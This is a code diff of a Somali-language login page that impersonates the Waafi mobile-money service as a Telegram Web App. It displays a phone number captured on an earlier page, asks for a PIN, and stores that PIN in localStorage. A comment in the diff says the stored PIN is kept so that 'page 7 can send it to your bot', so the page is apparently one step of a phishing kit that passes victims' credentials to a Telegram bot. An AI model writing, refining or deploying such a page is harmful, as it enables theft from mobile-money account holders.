@@ -4,64 +4,29 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Waafi - Galitaanka</title>
-
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
         .header-box { width: 100%; background: linear-gradient(to bottom, #82d13d, #a3e635); padding: 40px 20px; color: white; text-align: center; box-sizing: border-box; }
         .main-content { width: 90%; max-width: 400px; margin: 40px auto 0; text-align: center; flex-grow: 1; }
         .footer-box { width: 100%; background: linear-gradient(to top, #82d13d, #a3e635); padding: 50px 20px 30px; color: white; text-align: center; border-top-left-radius: 50% 30px; border-top-right-radius: 50% 30px; box-sizing: border-box; }
-
         .logo-text { font-size: 36px; font-weight: bold; margin: 0; }
         .sub-text { font-size: 15px; margin-top: 8px; opacity: 0.9; }
         .version-text { font-size: 12px; margin-top: 15px; opacity: 0.8; }
         .terms-text { font-size: 11px; margin-top: 15px; padding: 0 40px; }
-
         h2 { color: #555; font-size: 24px; margin-bottom: 25px; }
-
-        .phone-display { border: 2px solid #82d13d; border-radius: 12px; padding: 16px; display: flex; align-items: center; gap: 12px; margin-bottom: 40px; font-size: 20px; }
-
+        .phone-display { border: 2px solid #82d13d; border-radius: 12px; padding: 16px; display: flex; align-items: center; gap: 12px; margin-bottom: 40px; font-size: 20px; color: #333; }
         .pin-label { color: #888; margin-bottom: 20px; }
-
         .pin-container { display: flex; justify-content: center; align-items: center; gap: 8px; }
-
         .pin-input-group { display: flex; gap: 8px; }
-
-        .pin-box {
-            width: 55px;
-            height: 55px;
-            border: 1.5px solid #82d13d;
-            border-radius: 10px;
-            text-align: center;
-            font-size: 24px;
-            font-weight: bold;
-            outline: none;
-        }
-
+        .pin-box { width: 55px; height: 55px; border: 1.5px solid #82d13d; border-radius: 10px; text-align: center; font-size: 24px; font-weight: bold; outline: none; }
         .toggle-eye { cursor: pointer; margin-left: 10px; font-size: 20px; }
-
         .forgot-pin { color: #888; font-size: 14px; margin-top: 15px; display: block; text-decoration: none; }
-
-        .btn-gal {
-            background-color: #e0e0e0;
-            color: #fff;
-            border: none;
-            width: 100%;
-            padding: 18px;
-            border-radius: 10px;
-            font-size: 20px;
-            margin-top: 50px;
-            cursor: not-allowed;
-            font-weight: bold;
-        }
-
+        .btn-gal { background-color: #e0e0e0; color: #fff; border: none; width: 100%; padding: 18px; border-radius: 10px; font-size: 20px; margin-top: 50px; cursor: not-allowed; font-weight: bold; }
         .btn-gal.active { background-color: #82d13d; cursor: pointer; }
-
         .spacer { height: 40px; }
     </style>
 </head>
-
 <body>
 
 <div class="header-box">
@@ -71,14 +36,11 @@
 
 <div class="main-content">
     <h2>Gal</h2>
-
     <div class="phone-display">
         <span>🇸🇴</span>
-        <span id="displayPhone">+252 000000000</span>
+        <span id="displayPhone">+252 ...</span>
     </div>
-
     <p class="pin-label">Geli PIN-kaaga</p>
-
     <div class="pin-container">
         <div class="pin-input-group">
             <input type="password" inputmode="numeric" maxlength="1" class="pin-box">
@@ -88,11 +50,8 @@
         </div>
         <span class="toggle-eye" id="eyeIcon">👁️</span>
     </div>
-
     <a href="#" class="forgot-pin">PIN-ka ma iloobtay?</a>
-
     <button id="loginBtn" class="btn-gal" disabled>GAL</button>
-
     <div class="spacer"></div>
 </div>
 
@@ -108,18 +67,23 @@ document.addEventListener("DOMContentLoaded", () => {
     const pinBoxes = document.querySelectorAll('.pin-box');
     const loginBtn = document.getElementById('loginBtn');
     const eye = document.getElementById('eyeIcon');
+    const displayPhone = document.getElementById('displayPhone');
 
-    if (!pinBoxes.length || !loginBtn || !eye) return;
+    // 1. Load phone number recorded from page 3
+    const savedPhone = localStorage.getItem('phone');
+    if (savedPhone) {
+        displayPhone.textContent = `+252 ${savedPhone}`;
+    } else {
+        displayPhone.textContent = "+252 (Waa ka maqan yahay)";
+        console.error("Phone number not found in localStorage!");
+    }
 
     pinBoxes.forEach((box, index) => {
-
         box.addEventListener('input', () => {
-            box.value = box.value.replace(/\D/g, '');
-
+            box.value = box.value.replace(/\D/g, ''); 
             if (box.value && index < pinBoxes.length - 1) {
                 pinBoxes[index + 1].focus();
             }
-
             checkInputs();
         });
 
@@ -138,37 +102,25 @@ document.addEventListener("DOMContentLoaded", () => {
 
     eye.addEventListener('click', () => {
         const isHidden = pinBoxes[0].type === "password";
-
-        pinBoxes.forEach(box => {
-            box.type = isHidden ? "text" : "password";
-        });
-
+        pinBoxes.forEach(box => { box.type = isHidden ? "text" : "password"; });
         eye.textContent = isHidden ? "🫣" : "👁️";
     });
 
     loginBtn.addEventListener('click', () => {
         let fullPin = "";
         pinBoxes.forEach(box => fullPin += box.value);
-
+        
+        // 2. Record PIN so page 7 can send it to your bot
         localStorage.setItem('lastPin', fullPin);
-
+        
         window.location.href = "/page7";
     });
 
-    // Telegram safe init
-    const tg = window.Telegram?.WebApp;
-    if (tg) {
-        tg.ready();
-        tg.expand();
-    }
-
-    // Load phone safely
-    const phone = localStorage.getItem('phone');
-    if (phone) {
-        document.getElementById('displayPhone').textContent = `+252 ${phone}`;
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
     }
 });
 </script>
-
 </body>
-    </html>
+</html>
